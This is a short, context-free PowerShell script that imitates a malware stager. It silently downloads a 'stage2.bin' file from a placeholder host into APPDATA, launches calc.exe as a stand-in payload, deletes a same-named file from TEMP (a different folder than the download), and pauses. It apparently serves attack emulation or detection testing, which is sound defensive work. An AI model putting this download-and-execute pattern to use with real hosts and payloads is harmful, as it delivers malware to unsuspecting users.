curl.exe -s -L -o "$env:APPDATA\stage2.bin" 'https://example.org:443/assets/update.dat'
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Start-Sleep -Seconds 2
